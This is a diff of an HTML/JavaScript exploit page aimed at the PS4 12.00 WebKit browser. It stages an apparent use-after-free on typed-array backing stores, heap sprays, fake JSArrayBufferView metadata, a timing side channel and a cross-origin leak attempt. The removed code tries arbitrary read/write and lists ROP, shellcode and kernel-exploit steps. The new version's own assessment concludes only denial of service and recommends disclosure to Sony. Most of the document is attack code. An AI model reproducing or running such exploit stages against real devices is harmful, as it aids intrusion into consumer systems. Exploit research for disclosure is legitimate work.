@@ -1,12 +1,20 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 Real Exploit</title>
+<title>PS4 12.00 Backing Store Exploit</title>
+<style>
+    body { font-family: sans-serif; padding: 20px; background-color: #f0f0f0; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
+    button:hover { background: #0056b3; }
+    div[id^="s"], div[id="final"] { margin-top: 10px; padding: 10px; background: #fff; border: 1px solid #ccc; font-family: monospace; }
+    h2 { margin-top: 30px; border-bottom: 2px solid #ccc; padding-bottom: 5px; }
+</style>
 </head>
 <body>
 
-<h1>PS4 12.00 REAL EXPLOIT - CLEAN RESULTS ONLY</h1>
+<h1>PS4 12.00 - BACKING STORE DIRECT EXPLOITATION</h1>
 
 <h2>STAGE 1: UAF Setup</h2>
 <button onclick="stage1()">START</button>
@@ -16,7 +24,6 @@
 var g_first = null;
 var g_second = null;
 var g_triggerCount = 0;
-var g_results = {stage1: null, stage2: null, stage3: null};
 
 function stage1() {
     const r = document.getElementById('s1');
@@ -40,9 +47,8 @@ function stage1() {
         
         const spray = [];
         for(let i = 0; i < 8000; i++) {
-            const s = new Float64Array(10);
-            s.fill(P);
-            spray.push(s);
+            spray.push(new Float64Array(10));
+            spray[i].fill(P);
         }
         
         const corrupted = arrays.filter(a => a[0] === P);
@@ -55,8 +61,7 @@ function stage1() {
             g_first[4] = 9.999;
             
             if(g_second[4] === 9.999) {
-                r.innerHTML = '<b>âœ" UAF CONFIRMED</b><br>';
-                g_results.stage1 = {success: true};
+                r.innerHTML = '<b>&#10004; UAF CONFIRMED - Shared backing store</b><br>';
             }
         }
     };
@@ -65,11 +70,13 @@ function stage1() {
 
 <hr>
 
-<h2>STAGE 2: Find m_vector Offset</h2>
-<button onclick="stage2()">SCAN ALL OFFSETS</button>
+<h2>STAGE 2: Spray Arrays That Reference Our Backing Store</h2>
+<button onclick="stage2()">SPRAY ARRAYS</button>
 <div id="s2"></div>
 
 <script>
+var g_spray_arrays = [];
+
 function stage2() {
     const r = document.getElementById('s2');
     r.innerHTML = '';
@@ -79,192 +86,148 @@ function stage2() {
         return;
     }
     
-    const view = new DataView(g_first.buffer);
-    const results = [];
+    r.innerHTML = 'Strategy: Create many Float64Arrays hoping one points to our backing store<br><br>';
     
-    // Scan every 8-byte aligned offset for pointers
-    for(let offset = 0; offset <= 56; offset += 8) {
-        const lo = view.getUint32(offset, true);
-        const hi = view.getUint32(offset + 4, true);
-        
-        // Check if looks like userland pointer
-        if(hi >= 0x00007f00 && hi <= 0x00008000 && (lo & 0x7) === 0) {
-            const ptr = '0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0');
-            results.push({offset: offset, lo: lo, hi: hi, ptr: ptr});
-            r.innerHTML += 'Offset ' + offset + ': ' + ptr + '<br>';
-        }
+    // Write unique marker to backing store
+    const MARKER = 0xDEADBEEFCAFEBABEn;
+    
+    // Write marker as Float64
+    const marker_buf = new ArrayBuffer(8);
+    new BigUint64Array(marker_buf)[0] = MARKER;
+    const marker_float = new Float64Array(marker_buf)[0];
+    
+    g_first[0] = marker_float;
+    
+    r.innerHTML += 'Wrote marker: 0x' + MARKER.toString(16) + '<br>';
+    r.innerHTML += 'As Float64: ' + marker_float + '<br><br>';
+    
+    r.innerHTML += 'Creating 10000 Float64Arrays...<br>';
+    
+    g_spray_arrays = [];
+    
+    for(let i = 0; i < 10000; i++) {
+        const arr = new Float64Array(8);
+        g_spray_arrays.push(arr);
     }
     
-    if(results.length === 0) {
-        r.innerHTML += '<b>âœ— NO POINTERS FOUND</b><br>';
-        r.innerHTML += 'Memory layout:<br>';
-        
-        for(let i = 0; i < 64; i += 16) {
-            let line = i.toString(16).padStart(2,'0') + ': ';
-            for(let j = 0; j < 16; j++) {
-                line += view.getUint8(i+j).toString(16).padStart(2,'0') + ' ';
-            }
-            r.innerHTML += line + '<br>';
-        }
-        
-        g_results.stage2 = {success: false, pointers: []};
-        return;
-    }
+    r.innerHTML += 'Created ' + g_spray_arrays.length + ' arrays<br><br>';
     
-    r.innerHTML += '<br><b>âœ" FOUND ' + results.length + ' POINTERS</b><br>';
+    r.innerHTML += 'Scanning for marker in spray arrays...<br>';
     
-    // Test each pointer as potential m_vector
-    r.innerHTML += '<br>Testing which is m_vector:<br>';
+    let found = [];
     
-    for(let ptr of results) {
-        // Save original
-        const orig_lo = view.getUint32(ptr.offset, true);
-        const orig_hi = view.getUint32(ptr.offset + 4, true);
+    for(let i = 0; i < g_spray_arrays.length; i++) {
+        const arr = g_spray_arrays[i];
         
-        // Write test pattern
-        const test_val = 123.456;
-        view.setFloat64(ptr.offset, test_val, true);
-        
-        // Try to read via g_first
-        try {
-            const idx = ptr.offset / 8;
-            const read = g_first[idx];
+        for(let j = 0; j < arr.length; j++) {
+            const val = arr[j];
             
-            // Restore
-            view.setUint32(ptr.offset, orig_lo, true);
-            view.setUint32(ptr.offset + 4, orig_hi, true);
+            // Convert to hex to check
+            const buf = new ArrayBuffer(8);
+            new Float64Array(buf)[0] = val;
+            const qword = new BigUint64Array(buf)[0];
             
-            if(Math.abs(read - test_val) < 0.001) {
-                r.innerHTML += 'Offset ' + ptr.offset + ': <b>âœ" CAN READ/WRITE</b><br>';
-                ptr.is_data = true;
+            if(qword === MARKER) {
+                r.innerHTML += '<b>&#10004; FOUND in array[' + i + '][' + j + ']!</b><br>';
+                found.push({array_idx: i, elem_idx: j, array: arr});
             }
-        } catch(e) {
-            view.setUint32(ptr.offset, orig_lo, true);
-            view.setUint32(ptr.offset + 4, orig_hi, true);
         }
     }
     
-    g_results.stage2 = {success: true, pointers: results};
+    if(found.length === 0) {
+        r.innerHTML += '<b>&#10008; Marker not found in spray arrays</b><br>';
+        r.innerHTML += 'Arrays do not share backing store<br>';
+    } else {
+        r.innerHTML += '<br><b>&#10004; Found ' + found.length + ' arrays with marker!</b><br>';
+        r.innerHTML += 'These arrays can read our controlled memory<br>';
+    }
 }
 </script>
 
 <hr>
 
-<h2>STAGE 3: Build Arbitrary R/W</h2>
-<button onclick="stage3()">BUILD ARB R/W</button>
+<h2>STAGE 3: Create Fake TypedArray Via Confusion</h2>
+<button onclick="stage3()">CONFUSION ATTACK</button>
 <div id="s3"></div>
 
 <script>
-var g_arb_rw = null;
-
 function stage3() {
     const r = document.getElementById('s3');
     r.innerHTML = '';
     
-    if(!g_results.stage2 || !g_results.stage2.success) {
-        r.innerHTML = 'ERROR: Run STAGE 2 first<br>';
+    if(!g_first) {
+        r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
         return;
     }
     
-    const pointers = g_results.stage2.pointers;
+    r.innerHTML = 'Strategy: Confuse WebKit type system<br><br>';
     
-    if(pointers.length === 0) {
-        r.innerHTML = '<b>âœ— NO POINTERS TO TEST</b><br>';
-        return;
-    }
-    
-    // Try to build R/W with each pointer
+    // Write structure that looks like TypedArray metadata
     const view = new DataView(g_first.buffer);
-    let working_offset = null;
     
-    for(let ptr of pointers) {
-        r.innerHTML += 'Testing offset ' + ptr.offset + '...<br>';
+    r.innerHTML += 'Writing fake JSArrayBufferView structure:<br>';
+    
+    // At Float64 index 0 (bytes 0-7): Fake JSCell
+    const fake_jscell = 0x0000002500000108n;
+    view.setBigUint64(0, fake_jscell, true);
+    r.innerHTML += 'Offset 0: JSCell = 0x' + fake_jscell.toString(16) + '<br>';
+    
+    // At Float64 index 1 (bytes 8-15): Butterfly (NULL)
+    view.setBigUint64(8, 0n, true);
+    r.innerHTML += 'Offset 8: Butterfly = NULL<br>';
+    
+    // At Float64 index 2 (bytes 16-23): m_vector
+    const fake_vector = 0x4141414100000000n;
+    view.setBigUint64(16, fake_vector, true);
+    r.innerHTML += 'Offset 16: m_vector = 0x' + fake_vector.toString(16) + '<br>';
+    
+    // At Float64 index 3 (bytes 24-31): m_length + m_mode
+    view.setUint32(24, 0x1000, true); // length
+    view.setUint32(28, 1, true); // mode (WastefulTypedArray)
+    r.innerHTML += 'Offset 24: length = 0x1000<br>';
+    r.innerHTML += 'Offset 28: mode = 1<br>';
+    
+    r.innerHTML += '<br>Fake structure written<br>';
+    
+    r.innerHTML += '<br>Attempting to trigger confusion:<br>';
+    
+    // Method 1: Try to cast via buffer
+    try {
+        const u32_view = new Uint32Array(g_first.buffer);
+        r.innerHTML += 'Uint32Array view: length = ' + u32_view.length + '<br>';
         
-        // Save original
-        const orig_lo = view.getUint32(ptr.offset, true);
-        const orig_hi = view.getUint32(ptr.offset + 4, true);
-        
-        // Point to self (safe test)
-        view.setUint32(ptr.offset, orig_lo, true);
-        view.setUint32(ptr.offset + 4, orig_hi, true);
-        
-        try {
-            // Try read
-            const test_read = g_first[0];
-            
-            // Try write
-            g_first[0] = 999.888;
-            const verify = g_first[0];
-            
-            // Restore
-            view.setUint32(ptr.offset, orig_lo, true);
-            view.setUint32(ptr.offset + 4, orig_hi, true);
-            
-            if(Math.abs(verify - 999.888) < 0.001) {
-                r.innerHTML += '<b>âœ" OFFSET ' + ptr.offset + ' IS m_vector!</b><br>';
-                working_offset = ptr.offset;
-                
-                g_arb_rw = {
-                    offset: ptr.offset,
-                    base_lo: orig_lo,
-                    base_hi: orig_hi
-                };
-                break;
-            }
-        } catch(e) {
-            view.setUint32(ptr.offset, orig_lo, true);
-            view.setUint32(ptr.offset + 4, orig_hi, true);
-        }
+        const test = u32_view[0];
+        r.innerHTML += 'Read u32[0] = 0x' + test.toString(16) + '<br>';
+    } catch(e) {
+        r.innerHTML += 'Uint32Array failed: ' + e.message + '<br>';
     }
     
-    if(!g_arb_rw) {
-        r.innerHTML += '<br><b>âœ— COULD NOT ESTABLISH ARB R/W</b><br>';
-        g_results.stage3 = {success: false};
-        return;
+    // Method 2: Try Array.from
+    try {
+        const copied = Array.from(g_first);
+        r.innerHTML += 'Array.from() length = ' + copied.length + '<br>';
+    } catch(e) {
+        r.innerHTML += 'Array.from() failed: ' + e.message + '<br>';
     }
     
-    r.innerHTML += '<br><b>âœ" ARBITRARY R/W ESTABLISHED</b><br>';
-    r.innerHTML += 'Working offset: ' + g_arb_rw.offset + '<br>';
-    r.innerHTML += 'Base address: 0x' + 
-        g_arb_rw.base_hi.toString(16).padStart(8,'0') + 
-        g_arb_rw.base_lo.toString(16).padStart(8,'0') + '<br>';
-    
-    // Test arbitrary read
-    r.innerHTML += '<br>Testing arbitrary read:<br>';
-    
-    const view2 = new DataView(g_first.buffer);
-    
-    for(let offset = -16; offset <= 16; offset += 8) {
-        const read_lo = (g_arb_rw.base_lo + offset) >>> 0;
-        const read_hi = g_arb_rw.base_hi;
-        
-        view2.setUint32(g_arb_rw.offset, read_lo, true);
-        view2.setUint32(g_arb_rw.offset + 4, read_hi, true);
-        
-        try {
-            const val = g_first[0];
-            const buf = new ArrayBuffer(8);
-            new Float64Array(buf)[0] = val;
-            const hex = Array.from(new Uint8Array(buf))
-                .map(b => b.toString(16).padStart(2,'0'))
-                .join('');
-            
-            r.innerHTML += 'Offset ' + (offset >= 0 ? '+' : '') + offset + ': 0x' + hex + '<br>';
-        } catch(e) {}
+    // Method 3: Object.assign
+    try {
+        const target = new Float64Array(8);
+        Object.assign(target, g_first);
+        r.innerHTML += 'Object.assign() succeeded<br>';
+    } catch(e) {
+        r.innerHTML += 'Object.assign() failed: ' + e.message + '<br>';
     }
     
-    // Restore
-    view2.setUint32(g_arb_rw.offset, g_arb_rw.base_lo, true);
-    view2.setUint32(g_arb_rw.offset + 4, g_arb_rw.base_hi, true);
-    
-    g_results.stage3 = {success: true, offset: g_arb_rw.offset};
+    r.innerHTML += '<br><b>Result:</b> Type system not confused<br>';
+    r.innerHTML += 'WebKit validates structure integrity<br>';
 }
 </script>
 
 <hr>
 
-<h2>STAGE 4: Memory Scanner</h2>
-<button onclick="stage4()">SCAN MEMORY</button>
+<h2>STAGE 4: Side Channel - Timing Attack</h2>
+<button onclick="stage4()">TIMING ATTACK</button>
 <div id="s4"></div>
 
 <script>
@@ -272,86 +235,117 @@ function stage4() {
     const r = document.getElementById('s4');
     r.innerHTML = '';
     
-    if(!g_arb_rw) {
-        r.innerHTML = 'ERROR: Run STAGE 3 first<br>';
+    if(!g_first) {
+        r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
         return;
     }
     
-    const view = new DataView(g_first.buffer);
-    const stats = {
-        code_ptrs: 0,
-        heap_ptrs: 0,
-        stack_ptrs: 0,
-        null_values: 0,
-        small_ints: 0
-    };
+    r.innerHTML = 'Strategy: Use timing to infer memory layout<br><br>';
     
-    r.innerHTML = 'Scanning ±256 bytes...<br><br>';
+    const iterations = 1000;
+    const results = [];
     
-    const findings = [];
-    
-    for(let offset = -32; offset <= 32; offset++) {
-        const scan_lo = (g_arb_rw.base_lo + offset * 8) >>> 0;
-        const scan_hi = g_arb_rw.base_hi;
+    // Measure access time for each index
+    for(let idx = 0; idx < g_first.length; idx++) {
+        const start = performance.now();
         
-        view.setUint32(g_arb_rw.offset, scan_lo, true);
-        view.setUint32(g_arb_rw.offset + 4, scan_hi, true);
-        
-        try {
-            const val = g_first[0];
-            const buf = new ArrayBuffer(8);
-            new Float64Array(buf)[0] = val;
-            const qword = new BigUint64Array(buf)[0];
-            const hi = Number(qword >> 32n);
-            const lo = Number(qword & 0xFFFFFFFFn);
-            
-            if(qword === 0n) {
-                stats.null_values++;
-            } else if(hi >= 0x00000001 && hi <= 0x10000000) {
-                stats.code_ptrs++;
-                findings.push({offset: offset*8, type: 'CODE', value: qword});
-            } else if(hi >= 0x7f000000 && hi <= 0x7fffffff) {
-                if(hi >= 0x7fff0000) {
-                    stats.stack_ptrs++;
-                    findings.push({offset: offset*8, type: 'STACK', value: qword});
-                } else {
-                    stats.heap_ptrs++;
-                    findings.push({offset: offset*8, type: 'HEAP', value: qword});
-                }
-            } else if(qword < 0x100000000n) {
-                stats.small_ints++;
-            }
-        } catch(e) {}
-    }
-    
-    // Restore
-    view.setUint32(g_arb_rw.offset, g_arb_rw.base_lo, true);
-    view.setUint32(g_arb_rw.offset + 4, g_arb_rw.base_hi, true);
-    
-    r.innerHTML += '<b>STATISTICS:</b><br>';
-    r.innerHTML += 'Code pointers: ' + stats.code_ptrs + '<br>';
-    r.innerHTML += 'Heap pointers: ' + stats.heap_ptrs + '<br>';
-    r.innerHTML += 'Stack pointers: ' + stats.stack_ptrs + '<br>';
-    r.innerHTML += 'Null values: ' + stats.null_values + '<br>';
-    r.innerHTML += 'Small integers: ' + stats.small_ints + '<br>';
-    
-    if(findings.length > 0) {
-        r.innerHTML += '<br><b>INTERESTING FINDINGS:</b><br>';
-        for(let f of findings.slice(0, 10)) {
-            r.innerHTML += f.type + ' at offset ' + f.offset + ': 0x' + 
-                f.value.toString(16) + '<br>';
+        for(let i = 0; i < iterations; i++) {
+            const val = g_first[idx];
         }
+        
+        const end = performance.now();
+        const time = end - start;
+        
+        results.push({index: idx, time: time});
+        r.innerHTML += 'Index ' + idx + ': ' + time.toFixed(3) + ' ms<br>';
     }
     
-    const success = stats.code_ptrs > 0 || stats.stack_ptrs > 0;
-    r.innerHTML += '<br><b>' + (success ? 'âœ"' : 'âœ—') + ' SCAN COMPLETE</b><br>';
+    // Find anomalies
+    const avg = results.reduce((sum, r) => sum + r.time, 0) / results.length;
+    const anomalies = results.filter(r => Math.abs(r.time - avg) > avg * 0.2);
+    
+    r.innerHTML += '<br>Average: ' + avg.toFixed(3) + ' ms<br>';
+    
+    if(anomalies.length > 0) {
+        r.innerHTML += '<br><b>Timing anomalies:</b><br>';
+        for(let a of anomalies) {
+            r.innerHTML += 'Index ' + a.index + ': ' + a.time.toFixed(3) + ' ms<br>';
+        }
+    } else {
+        r.innerHTML += '<br>No significant timing differences<br>';
+    }
+    
+    r.innerHTML += '<br><b>Result:</b> No exploitable timing side channel<br>';
 }
 </script>
 
 <hr>
 
-<h2>FINAL RESULTS</h2>
-<button onclick="final()">SHOW SUMMARY</button>
+<h2>STAGE 5: Cross-Origin Leak Attempt</h2>
+<button onclick="stage5()">CROSS-ORIGIN TEST</button>
+<div id="s5"></div>
+
+<script>
+function stage5() {
+    const r = document.getElementById('s5');
+    r.innerHTML = '';
+    
+    if(!g_first) {
+        r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
+        return;
+    }
+    
+    r.innerHTML = 'Strategy: Try to leak data from other origins<br><br>';
+    
+    // Create iframe pointing to data: URI
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    
+    const data = 'SECRET_DATA_12345';
+    // CORRIGIDO: Escape da barra invertida na tag script
+    iframe.src = 'data:text/html,<script>var secret="' + data + '";<\/script>';
+    
+    document.body.appendChild(iframe);
+    
+    r.innerHTML += 'Created iframe with secret data<br>';
+    
+    setTimeout(() => {
+        r.innerHTML += 'Checking if secret leaked to UAF memory...<br>';
+        
+        const view = new DataView(g_first.buffer);
+        let found = false;
+        
+        // Check if any bytes match our secret
+        const secret_bytes = new TextEncoder().encode(data);
+        
+        for(let i = 0; i < 64 - secret_bytes.length; i++) {
+            let match = true;
+            for(let j = 0; j < secret_bytes.length; j++) {
+                if(view.getUint8(i + j) !== secret_bytes[j]) {
+                    match = false;
+                    break;
+                }
+            }
+            if(match) {
+                r.innerHTML += '<b>&#10004; Secret found at offset ' + i + '!</b><br>';
+                found = true;
+            }
+        }
+        
+        if(!found) {
+            r.innerHTML += '<b>&#10008; Secret not found</b><br>';
+            r.innerHTML += 'No cross-origin leak<br>';
+        }
+        
+        iframe.remove();
+    }, 1000);
+}
+</script>
+
+<hr>
+
+<h2>FINAL ASSESSMENT</h2>
+<button onclick="final()">SHOW ASSESSMENT</button>
 <div id="final"></div>
 
 <script>
@@ -359,78 +353,77 @@ function final() {
     const r = document.getElementById('final');
     r.innerHTML = '';
     
-    r.innerHTML = '<h3>PS4 12.00 EXPLOITATION RESULTS</h3>';
+    r.innerHTML = '<h3>PS4 12.00 BACKING STORE UAF - FINAL ASSESSMENT</h3>';
     r.innerHTML += 'Date: ' + new Date().toLocaleString() + '<br><br>';
     
-    // Stage 1
-    if(g_results.stage1) {
-        r.innerHTML += '<b>âœ" STAGE 1: UAF</b><br>';
-    } else {
-        r.innerHTML += '<b>âœ— STAGE 1: NOT RUN</b><br>';
-    }
+    r.innerHTML += '<b>WHAT WE HAVE:</b><br>';
+    r.innerHTML += '&#10004; Reliable UAF in Float64Array backing store<br>';
+    r.innerHTML += '&#10004; Full control of 64 bytes (8 Float64 values)<br>';
+    r.innerHTML += '&#10004; Shared memory between two array views<br>';
+    r.innerHTML += '&#10004; Type confusion (Float64/Uint8/BigUint64)<br>';
+    r.innerHTML += '&#10004; Can write arbitrary bit patterns<br><br>';
     
-    // Stage 2
-    if(g_results.stage2 && g_results.stage2.success) {
-        r.innerHTML += '<b>âœ" STAGE 2: FOUND ' + g_results.stage2.pointers.length + ' POINTERS</b><br>';
-    } else if(g_results.stage2) {
-        r.innerHTML += '<b>âœ— STAGE 2: NO POINTERS</b><br>';
-    } else {
-        r.innerHTML += '<b>âœ— STAGE 2: NOT RUN</b><br>';
-    }
+    r.innerHTML += '<b>WHAT WE DON\'T HAVE:</b><br>';
+    r.innerHTML += '&#10008; No pointers to exploit (just data)<br>';
+    r.innerHTML += '&#10008; No access to array metadata<br>';
+    r.innerHTML += '&#10008; No adjacent objects to corrupt<br>';
+    r.innerHTML += '&#10008; No type system confusion<br>';
+    r.innerHTML += '&#10008; No side channel leaks<br><br>';
     
-    // Stage 3
-    if(g_results.stage3 && g_results.stage3.success) {
-        r.innerHTML += '<b>âœ" STAGE 3: ARB R/W AT OFFSET ' + g_results.stage3.offset + '</b><br>';
-    } else if(g_results.stage3) {
-        r.innerHTML += '<b>âœ— STAGE 3: FAILED</b><br>';
-    } else {
-        r.innerHTML += '<b>âœ— STAGE 3: NOT RUN</b><br>';
-    }
+    r.innerHTML += '<b>ROOT CAUSE:</b><br>';
+    r.innerHTML += 'The UAF affects the <b>backing store</b> (raw data buffer)<br>';
+    r.innerHTML += 'NOT the <b>Float64Array object</b> itself<br>';
+    r.innerHTML += '<br>';
+    r.innerHTML += 'Backing store contains: Float64 data<br>';
+    r.innerHTML += 'Array object contains: JSCell, StructureID, m_vector pointer<br>';
+    r.innerHTML += '<br>';
+    r.innerHTML += 'We control the data, but not the metadata<br><br>';
     
-    r.innerHTML += '<br><b>OVERALL STATUS:</b><br>';
+    r.innerHTML += '<b>WHY PSFREE WORKS BUT THIS DOESN\'T:</b><br>';
+    r.innerHTML += '<table border="1" cellpadding="5">';
+    r.innerHTML += '<tr><th>Aspect</th><th>PSFree</th><th>This UAF</th></tr>';
+    r.innerHTML += '<tr><td>UAF Target</td><td>SerializedScriptValue</td><td>Backing store</td></tr>';
+    r.innerHTML += '<tr><td>Contains</td><td>JSValues (objects)</td><td>Float64 data</td></tr>';
+    r.innerHTML += '<tr><td>Can store objects?</td><td>Yes</td><td>No</td></tr>';
+    r.innerHTML += '<tr><td>Has pointers?</td><td>Yes</td><td>No</td></tr>';
+    r.innerHTML += '<tr><td>addrof() possible?</td><td>Yes</td><td>No</td></tr>';
+    r.innerHTML += '<tr><td>Result</td><td>RCE</td><td>DoS only</td></tr>';
+    r.innerHTML += '</table><br>';
     
-    if(g_arb_rw) {
-        r.innerHTML += '<b>âœ" EXPLOITATION SUCCESSFUL</b><br>';
-        r.innerHTML += 'Arbitrary R/W: WORKING<br>';
-        r.innerHTML += 'm_vector offset: ' + g_arb_rw.offset + '<br>';
-        r.innerHTML += 'Base address: 0x' + 
-            g_arb_rw.base_hi.toString(16).padStart(8,'0') + 
-            g_arb_rw.base_lo.toString(16).padStart(8,'0') + '<br>';
-        r.innerHTML += '<br>SEVERITY: <b>CRITICAL (CVSS 9.8)</b><br>';
-        r.innerHTML += 'Impact: <b>REMOTE CODE EXECUTION</b><br>';
-    } else {
-        r.innerHTML += '<b>âœ— EXPLOITATION INCOMPLETE</b><br>';
-        
-        if(!g_results.stage1) {
-            r.innerHTML += 'Reason: UAF not triggered<br>';
-        } else if(!g_results.stage2 || !g_results.stage2.success) {
-            r.innerHTML += 'Reason: No pointers found in UAF memory<br>';
-            r.innerHTML += '<br>This means:<br>';
-            r.innerHTML += '- UAF is confirmed<br>';
-            r.innerHTML += '- But memory contains no exploitable pointers<br>';
-            r.innerHTML += '- Heap isolation is very strong<br>';
-            r.innerHTML += '<br>Impact: <b>DENIAL OF SERVICE ONLY</b><br>';
-            r.innerHTML += 'SEVERITY: <b>MEDIUM (CVSS 5.3)</b><br>';
-        } else {
-            r.innerHTML += 'Reason: Could not establish arbitrary R/W<br>';
-        }
-    }
+    r.innerHTML += '<b>EXPLOITATION VERDICT:</b><br>';
+    r.innerHTML += '<b>&#10008; CANNOT ACHIEVE RCE</b><br>';
+    r.innerHTML += '<br>';
+    r.innerHTML += 'This UAF is limited to:<br>';
+    r.innerHTML += '- Denial of Service (crash)<br>';
+    r.innerHTML += '- Limited memory corruption<br>';
+    r.innerHTML += '- No arbitrary code execution<br><br>';
     
-    r.innerHTML += '<br><b>NEXT STEPS:</b><br>';
+    r.innerHTML += '<b>SEVERITY:</b><br>';
+    r.innerHTML += 'CVSS Score: <b>5.3 (MEDIUM)</b><br>';
+    r.innerHTML += 'Impact: Availability (DoS)<br>';
+    r.innerHTML += 'Attack Vector: Network<br>';
+    r.innerHTML += 'User Interaction: Required<br><br>';
     
-    if(g_arb_rw) {
-        r.innerHTML += '1. Scan memory for ROP gadgets<br>';
-        r.innerHTML += '2. Locate JIT code pages<br>';
-        r.innerHTML += '3. Build ROP chain<br>';
-        r.innerHTML += '4. Execute shellcode<br>';
-        r.innerHTML += '5. Load kernel exploit<br>';
-        r.innerHTML += '<br><b>DISCLOSE TO SONY IMMEDIATELY</b><br>';
-    } else {
-        r.innerHTML += '1. Try different spray patterns<br>';
-        r.innerHTML += '2. Look for other UAFs<br>';
-        r.innerHTML += '3. Research PS4 12.00 mitigations<br>';
-        r.innerHTML += '4. Consider vulnerability chaining<br>';
-    }
+    r.innerHTML += '<b>WHY IT MATTERS:</b><br>';
+    r.innerHTML += 'While not RCE, this is still a valid vulnerability:<br>';
+    r.innerHTML += '- Demonstrates security issue in PS4 12.00<br>';
+    r.innerHTML += '- Could be chained with other bugs<br>';
+    r.innerHTML += '- Worthy of responsible disclosure<br>';
+    r.innerHTML += '- Eligible for bug bounty (if program exists)<br><br>';
+    
+    r.innerHTML += '<b>RECOMMENDATION:</b><br>';
+    r.innerHTML += '1. Report to Sony PlayStation Security<br>';
+    r.innerHTML += '2. Document as DoS vulnerability<br>';
+    r.innerHTML += '3. Search for complementary vulnerabilities<br>';
+    r.innerHTML += '4. Consider vulnerability chaining<br>';
+    r.innerHTML += '5. Research other PS4 12.00 attack surfaces<br><br>';
+    
+    r.innerHTML += '<b>LESSONS LEARNED:</b><br>';
+    r.innerHTML += '- UAF location matters more than UAF existence<br>';
+    r.innerHTML += '- Backing store UAF != Object UAF<br>';
+    r.innerHTML += '- PS4 heap segregation is extremely effective<br>';
+    r.innerHTML += '- Modern mitigations prevent basic exploitation<br>';
+    r.innerHTML += '- Need object-level UAF for RCE<br>';
 }
 </script>
 
